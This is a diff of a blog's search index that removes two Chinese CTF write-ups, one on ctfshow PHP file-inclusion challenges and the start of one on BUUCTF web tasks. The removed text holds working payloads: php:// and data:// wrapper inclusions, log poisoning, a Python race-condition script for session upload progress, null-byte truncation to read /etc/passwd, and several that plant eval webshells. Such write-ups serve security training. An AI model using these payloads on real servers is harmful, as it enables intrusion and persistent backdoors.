@@ -138,138 +138,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ctfshow入门文件包含部分</title>
-    <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
-<a id="more"></a>
-<h2 id="web-78"><a class="header-anchor" href="#web-78">¶</a>web 78</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="web-79"><a class="header-anchor" href="#web-79">¶</a>web 79</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br></pre></td></tr></table></figure>
-<h2 id="web-80-81"><a class="header-anchor" href="#web-80-81">¶</a>web 80-81</h2>
-<p>试了试文件日志包含漏洞</p>
-<p>先抓包,发现是nginx，一般的日志路径为  <code>/var/log/nginx/access.log</code></p>
-<p>访问发现成功</p>
-<p>进行getshell  先ls (可能需要多go几次)</p>
-<p><a href="https://imgchr.com/i/sClU7n"><img src="https://s3.ax1x.com/2021/01/03/sClU7n.png" alt="sClU7n.png"></a></p>
-<p>得到flag</p>
-<p><a href="https://imgchr.com/i/sClscF"><img src="https://s3.ax1x.com/2021/01/03/sClscF.png" alt="sClscF.png"></a></p>
-<h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2>
-<p><strong>这题是利用 session.upload_progress 包含文件漏洞</strong></p>
-<p>session.upload_progress在php5.4添加的。</p>
-<p>在php.ini有以下几个默认选项</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
-<ol>
-<li>
-<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
-</li>
-<li>
-<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
-</li>
-<li>
-<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
-<p><a href="https://imgchr.com/i/sCl27R"><img src="https://s3.ax1x.com/2021/01/03/sCl27R.png" alt="sCl27R.png"></a></p>
-</li>
-<li>
-<p><code>prefix+name</code>将表示为session中的键名</p>
-</li>
-</ol>
-<p>另外，再添加个session配置中一个重要选项。</p>
-<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
-<p><strong>分析</strong></p>
-<p>如果<strong>session.auto_start=On</strong> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行<strong>session_start()</strong>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<strong>session.use_strict_mode</strong>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
-<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
-<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
-<p><strong>session文件默认存储路径</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
-<p>进入正题</p>
-<p><strong>题目源码:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: h1xa</span><br><span class="line">\# @Date:  2020-09-16 11:25:09</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-16 19:34:45</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">  $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">  include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag”    然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下</p>
-<p><a href="https://imgchr.com/i/sClocD"><img src="https://s3.ax1x.com/2021/01/03/sClocD.png" alt="sClocD.png"></a></p>
-<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
-<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
-<p><a href="https://imgchr.com/i/sClj4P"><img src="https://s3.ax1x.com/2021/01/03/sClj4P.png" alt="sClj4P.png"></a></p>
-<p>两个包payload设置如下</p>
-<p><a href="https://imgchr.com/i/sC1SgS"><img src="https://s3.ax1x.com/2021/01/03/sC1SgS.png" alt="sC1SgS.png"></a></p>
-<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
-<p><a href="https://imgchr.com/i/sC1PBj"><img src="https://s3.ax1x.com/2021/01/03/sC1PBj.png" alt="sC1PBj.png"></a></p>
-<p>同理也能得到flag</p>
-<p><a href="https://imgchr.com/i/sC1ZCV"><img src="https://s3.ax1x.com/2021/01/03/sC1ZCV.png" alt="sC1ZCV.png"></a></p>
-<p><strong>也可以使用python脚本</strong></p>
-<p>也直接用前面文章里的脚本：</p>
-<p>附上大佬的脚本</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>改下url和要执行的shell即可</p>
-<p><strong>参考文章:</strong></p>
-<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
-<p><a href="https://blog.csdn.net/qq_44657899/article/details/109281343">https://blog.csdn.net/qq_44657899/article/details/109281343</a></p>
-<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
-<h2 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h2>
-<p><strong>源码:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:28:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>warning提示了  ，所以表单构造需要重新构造，多了 <code>session_start();</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;668ba926-9165-49e7-92fb-c94a08d54feb.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;2333&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>web82-86用py脚本都能跑过</strong></p>
-<h2 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:40:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf &#x2F;tmp&#x2F;*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:59:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content &#x3D; file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 21:20:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">define(&#39;还要秀？&#39;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析源码，这题有两个传参，file和 content，然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了，我们所要做的就是绕过die</p>
-<p>这里放上p神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1">谈一谈php://filter的妙用</a></p>
-<p>p神文章已经讲得很清楚了，base64算法解码时是4个byte一组, 而phpdie共6个字符，所以我们解码的时候需要再添加两个字符</p>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php(file的内容需要进行两次url编码)</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-<p>写入一句话后，然后访问 1.php，就可以执行shell了</p>
-<p><a href="https://imgchr.com/i/sC1NvD"><img src="https://s3.ax1x.com/2021/01/03/sC1NvD.png" alt="sC1NvD.png"></a></p>
-<h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-17 02:27:25</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    if(preg_match(&quot;&#x2F;php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\.&#x2F;i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>data协议绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</span><br><span class="line"></span><br><span class="line">即 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>
-<h2 id="其他包含小姿势"><a class="header-anchor" href="#其他包含小姿势">¶</a>其他包含小姿势</h2>
-<p>审计中可见这样的包含模版文件：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.htm&quot;</span>); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-<ol>
-<li>%00截断<br>
-/etc/passwd%00<br>
-(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
-<li>%00截断目录遍历：<br>
-/var/www/%00<br>
-(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
-<li>路径长度截断：<br>
-/etc/passwd/././././././.[…]/./././././.<br>
-(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
-<li>点号截断：<br>
-/boot.ini/………[…]…………<br>
-(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
-</ol>
-<h3 id="php-input"><a class="header-anchor" href="#php-input">¶</a>php://input</h3>
-<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
-<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
-<blockquote>
-<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
-</blockquote>
-<p>假设页面源代码为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if (@file_get_content($file) &#x3D;&#x3D; &#39;meizijiu&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>直接使用Hackbar工具POST数据：</p>
-<p><a href="https://imgchr.com/i/sC1DUI"><img src="https://s3.ax1x.com/2021/01/03/sC1DUI.png" alt="sC1DUI.png"></a></p>
-<p>另外还可以写入一句话</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>参考</strong>:<a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/13.文件包含漏洞利用/</a></p>
-<p><a href="https://www.cnblogs.com/NPFS/p/13797449.html">https://www.cnblogs.com/NPFS/p/13797449.html</a></p>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ctfshow入门sql注入部分</title>
     <url>/2021/01/01/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/</url>
     <content><![CDATA[<p><strong>ctfshow web入门 sql注入部分(不断更新)</strong></p>
@@ -401,153 +269,6 @@
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>buuctf之web</title>
-    <url>/2021/01/12/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>buuctf之web刷题记录</p>
-<a id="more"></a>
-<h1>[HCTF 2018]WarmUp</h1>
-<p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
-<p>右键源代码得到提示</p>
-<p>访问source.php 得到源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! 